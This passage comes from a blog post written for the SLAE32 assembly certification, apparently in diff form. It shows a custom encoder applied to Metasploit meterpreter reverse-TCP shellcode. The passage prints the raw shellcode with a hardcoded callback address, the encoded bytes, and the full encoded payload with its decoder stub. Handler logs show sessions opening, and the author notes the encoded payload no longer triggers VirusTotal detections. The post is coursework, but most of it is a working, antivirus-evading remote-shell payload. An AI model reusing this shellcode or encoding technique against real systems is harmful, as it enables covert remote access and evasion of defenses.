+"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
+"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
+"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
+"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
+"\x00\xcd\x80";
+</code></pre></div></div>
+
+<p>Testing the shellcode with the test program:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment4$ gcc -z execstack -o msf msf.c
+slemire@slae:~/slae32/assignment4$ file msf
+msf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b36888fc1e3651d37ea86204f44e8d4078f99bd7, not stripped
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 172.23.10.40:4444 
+[*] Sending stage (861480 bytes) to 172.23.10.37
+[*] Meterpreter session 1 opened (172.23.10.40:4444 -&gt; 127.0.0.1) at 2018-11-22 08:08:36 -0500
+</code></pre></div></div>
+
+<p>When submitted on VirusTotal, the meterpreter payload was picked up by a few AV engines:</p>
+
+<p><img src="/assets/images/custom-encoder/msfpayload_plain.png" alt="" /></p>
+
+<h2 id="encoded-version">Encoded version</h2>
+
+<p>Next, the same payload was encoded with the custom encoder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment4$ ./encoder.py msf_met_reversetcp.txt 
+[+] Shellcode not 4 bytes aligned, adding 1 \x90 bytes of padding...
+[+] Original shellcode (len: 124): \x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90
+[+] Encoded shellcode (len: 159): \x44\x75\x1a\x4e\x2e\x96\xc5\x75\x61\x4d\xcc\xce\xa6\x9f\x8f\xb4\x55\x3d\xd2\x04\x28\x73\xbf\xa8\xe5\xca\xc0\xdd\x66\xa2\xb1\xb1\xb3\xd9\x99\xf0\x11\x79\xac\xe1\x23\x73\x7b\x45\x49\x40\xa1\xc9\x17\x11\xdf\x5a\x5f\x12\x9c\x4b\x05\x52\x32\x8b\xa9\x0b\xc1\x94\xdd\x0a\x52\x0a\x0a\x0a\xb7\xb2\xdd\xb7\xdd\x07\xce\x36\xe4\x8e\xf6\x36\x73\x76\x3b\x45\x62\xae\xf8\x3c\x24\x24\x9d\x23\x96\x9c\x15\x9c\x9c\x8c\xf7\xfb\x1c\x36\x14\x38\x88\x34\xdb\xf9\xcf\x4a\x4f\x02\xb2\x72\x29\x62\x0a\xb2\x88\x3e\x11\x69\x01\x3b\xf6\x38\x8b\x37\x8c\xf4\x4c\x09\x0c\x35\x8d\xd4\xca\x37\xa9\xa9\xa9\xa9\xa8\x65\x65\x65\x64\xde\x9b\x0b\x1b\x56\x9b\x90\x90\xaa\xaa
+[+] Encoded shell in NASM format: 0x44,0x75,0x1a,0x4e,0x2e,0x96,0xc5,0x75,0x61,0x4d,0xcc,0xce,0xa6,0x9f,0x8f,0xb4,0x55,0x3d,0xd2,0x04,0x28,0x73,0xbf,0xa8,0xe5,0xca,0xc0,0xdd,0x66,0xa2,0xb1,0xb1,0xb3,0xd9,0x99,0xf0,0x11,0x79,0xac,0xe1,0x23,0x73,0x7b,0x45,0x49,0x40,0xa1,0xc9,0x17,0x11,0xdf,0x5a,0x5f,0x12,0x9c,0x4b,0x05,0x52,0x32,0x8b,0xa9,0x0b,0xc1,0x94,0xdd,0x0a,0x52,0x0a,0x0a,0x0a,0xb7,0xb2,0xdd,0xb7,0xdd,0x07,0xce,0x36,0xe4,0x8e,0xf6,0x36,0x73,0x76,0x3b,0x45,0x62,0xae,0xf8,0x3c,0x24,0x24,0x9d,0x23,0x96,0x9c,0x15,0x9c,0x9c,0x8c,0xf7,0xfb,0x1c,0x36,0x14,0x38,0x88,0x34,0xdb,0xf9,0xcf,0x4a,0x4f,0x02,0xb2,0x72,0x29,0x62,0x0a,0xb2,0x88,0x3e,0x11,0x69,0x01,0x3b,0xf6,0x38,0x8b,0x37,0x8c,0xf4,0x4c,0x09,0x0c,0x35,0x8d,0xd4,0xca,0x37,0xa9,0xa9,0xa9,0xa9,0xa8,0x65,0x65,0x65,0x64,0xde,0x9b,0x0b,0x1b,0x56,0x9b,0x90,0x90,0xaa,0xaa
+</code></pre></div></div>
+
+<p>The shellcode is added to the decoder stub assembly file, compiled and linked:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment4$ ../compile.sh stub_decoder
+[+] Assembling with Nasm ... 
+[+] Linking ...
+[+] Shellcode: \xeb\x57\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5e\xbf\x90\x90\xaa\xaa\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x8a\x5c\x16\x01\x8a\x7c\x16\x02\x8a\x4c\x16\x03\x8a\x6c\x16\x04\x32\x1c\x16\x32\x3c\x16\x32\x0c\x16\x32\x2c\x16\x88\x2c\x04\x88\x4c\x04\x01\x88\x7c\x04\x02\x88\x5c\x04\x03\x39\x7c\x16\x05\x74\x0a\x42\x42\x42\x42\x42\x83\xc0\x04\x75\xc5\xff\xe4\xe8\xa4\xff\xff\xff\x44\x75\x1a\x4e\x2e\x96\xc5\x75\x61\x4d\xcc\xce\xa6\x9f\x8f\xb4\x55\x3d\xd2\x04\x28\x73\xbf\xa8\xe5\xca\xc0\xdd\x66\xa2\xb1\xb1\xb3\xd9\x99\xf0\x11\x79\xac\xe1\x23\x73\x7b\x45\x49\x40\xa1\xc9\x17\x11\xdf\x5a\x5f\x12\x9c\x4b\x05\x52\x32\xa9\x0b\xc1\x94\xdd\x0a\x52\x0a\x0a\x0a\xb7\xb2\xdd\xb7\xdd\x07\xce\x36\xe4\x8e\xf6\x36\x73\x76\x3b\x45\x62\xae\xf8\x3c\x24\x24\x9d\x23\x96\x9c\x15\x9c\x9c\x8c\xf7\xfb\x1c\x36\x14\x38\x88\x34\xdb\xf9\xcf\x4a\x4f\x02\xb2\x72\x29\x62\x0a\xb2\x88\x3e\x11\x69\x01\x3b\xf6\x38\x8b\x37\x8c\xf4\x4c\x09\x0c\x35\x8d\xd4\xca\xa9\xa9\xa9\xa9\xa8\x65\x65\x65\x64\xde\x9b\x1b\x56\x9b\x90\x90\xaa\xaa
+[+] Length: 250
+[+] Done!
+</code></pre></div></div>
+
+<p>Veryfing that the shellcode still works…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 172.23.10.40:4444 
+[*] Sending stage (861480 bytes) to 172.23.10.37
+[*] Meterpreter session 3 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-11-22 08:16:09 -0500
+</code></pre></div></div>
+
+<p>The file is not picked up by Virus Total anymore:</p>
+
+<p><img src="/assets/images/custom-encoder/msfpayload_encoded.png" alt="" /></p>
+
+<h2 id="automating-the-creation-of-the-shellcode">Automating the creation of the shellcode</h2>
+
+<p>We don’t need to manually add the encoded shellcode to the <code class="language-plaintext highlighter-rouge">.asm</code> file every time and re-compile from NASM. The python script has been modified to automatically prepend the decoder stub to the output shellcode so we can just use this in the test C program.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment4$ ./encoder.py msf_met_reversetcp.txt 
+[+] Shellcode not 4 bytes aligned, adding 1 \x90 bytes of padding...
+[+] Original shellcode (len: 124): \x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90
+
+[+] Encoded shellcode (len: 159): \x45\x74\x1b\x4f\x2f\x45\x16\xa6\xb2\x9e\x93\x91\xf9\xc0\xd0\x22\xc3\xab\x44\x92\xcf\x94\x58\x4f\x02\x94\x9e\x83\x38\xfc\x7c\x7c\x7e\x14\x54\x3a\xdb\xb3\x66\x2b\xd5\x85\x8d\xb3\xbf\xb6\x57\x3f\xe1\xe7\x39\xbc\xb9\xf4\x7a\x2f\x61\x36\x56\xef\x4f\xed\x27\x72\x3b\x9c\xc4\x9c\x9c\x9c\x5c\x59\x36\x5c\x36\x70\xb9\x41\x93\xf9\x17\xd7\x92\x97\xda\x95\xb2\x7e\x28\xec\x77\x77\xce\x70\xc5\xd3\x5a\xd3\xd3\xc3\x14\x18\xff\xd5\xf7\x7e\xce\x72\x9d\xbf\xe4\x61\x64\x29\x99\x67\x3c\x77\x1f\xa7\xa0\x16\x39\x41\x29\xf7\x3a\xf4\x47\xfb\x5c\x24\x9c\xd9\xdc\x3d\x85\xdc\xc2\x3f\x51\x51\x51\x51\x50\x77\x77\x77\x76\xcc\x6f\xff\xef\xa2\x6f\x90\x90\xaa\xaa
+
+[+] Encoded shell in NASM format: 0x45,0x74,0x1b,0x4f,0x2f,0x45,0x16,0xa6,0xb2,0x9e,0x93,0x91,0xf9,0xc0,0xd0,0x22,0xc3,0xab,0x44,0x92,0xcf,0x94,0x58,0x4f,0x02,0x94,0x9e,0x83,0x38,0xfc,0x7c,0x7c,0x7e,0x14,0x54,0x3a,0xdb,0xb3,0x66,0x2b,0xd5,0x85,0x8d,0xb3,0xbf,0xb6,0x57,0x3f,0xe1,0xe7,0x39,0xbc,0xb9,0xf4,0x7a,0x2f,0x61,0x36,0x56,0xef,0x4f,0xed,0x27,0x72,0x3b,0x9c,0xc4,0x9c,0x9c,0x9c,0x5c,0x59,0x36,0x5c,0x36,0x70,0xb9,0x41,0x93,0xf9,0x17,0xd7,0x92,0x97,0xda,0x95,0xb2,0x7e,0x28,0xec,0x77,0x77,0xce,0x70,0xc5,0xd3,0x5a,0xd3,0xd3,0xc3,0x14,0x18,0xff,0xd5,0xf7,0x7e,0xce,0x72,0x9d,0xbf,0xe4,0x61,0x64,0x29,0x99,0x67,0x3c,0x77,0x1f,0xa7,0xa0,0x16,0x39,0x41,0x29,0xf7,0x3a,0xf4,0x47,0xfb,0x5c,0x24,0x9c,0xd9,0xdc,0x3d,0x85,0xdc,0xc2,0x3f,0x51,0x51,0x51,0x51,0x50,0x77,0x77,0x77,0x76,0xcc,0x6f,0xff,0xef,0xa2,0x6f,0x90,0x90,0xaa,0xaa
+
+[+] Encoded shellcode /w decoder stub (len: 253): \xeb\x57\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x5e\xbf\x90\x90\xaa\xaa\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x83\xec\x7f\x8a\x5c\x16\x1\x8a\x7c\x16\x2\x8a\x4c\x16\x3\x8a\x6c\x16\x4\x32\x1c\x16\x32\x3c\x16\x32\xc\x16\x32\x2c\x16\x88\x2c\x4\x88\x4c\x4\x1\x88\x7c\x4\x2\x88\x5c\x4\x3\x39\x7c\x16\x5\x74\xa\x42\x42\x42\x42\x42\x83\xc0\x4\x75\xc5\xff\xe4\xe8\xa4\xff\xff\xff\x45\x74\x1b\x4f\x2f\x45\x16\xa6\xb2\x9e\x93\x91\xf9\xc0\xd0\x22\xc3\xab\x44\x92\xcf\x94\x58\x4f\x02\x94\x9e\x83\x38\xfc\x7c\x7c\x7e\x14\x54\x3a\xdb\xb3\x66\x2b\xd5\x85\x8d\xb3\xbf\xb6\x57\x3f\xe1\xe7\x39\xbc\xb9\xf4\x7a\x2f\x61\x36\x56\xef\x4f\xed\x27\x72\x3b\x9c\xc4\x9c\x9c\x9c\x5c\x59\x36\x5c\x36\x70\xb9\x41\x93\xf9\x17\xd7\x92\x97\xda\x95\xb2\x7e\x28\xec\x77\x77\xce\x70\xc5\xd3\x5a\xd3\xd3\xc3\x14\x18\xff\xd5\xf7\x7e\xce\x72\x9d\xbf\xe4\x61\x64\x29\x99\x67\x3c\x77\x1f\xa7\xa0\x16\x39\x41\x29\xf7\x3a\xf4\x47\xfb\x5c\x24\x9c\xd9\xdc\x3d\x85\xdc\xc2\x3f\x51\x51\x51\x51\x50\x77\x77\x77\x76\xcc\x6f\xff\xef\xa2\x6f\x90\x90\xaa\xaa
+</code></pre></div></div>
+
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
+
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<p>Student ID: SLAE-1236</p>
+
+<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#encoding" class="page__taxonomy-item" rel="tag">encoding</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-11-22T00:00:00+01:00">November 22, 2018</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/egghunter/" class="pagination--pager" title="Egghunter Linux Shellcode
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-smasher/" class="pagination--pager" title="Smasher - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
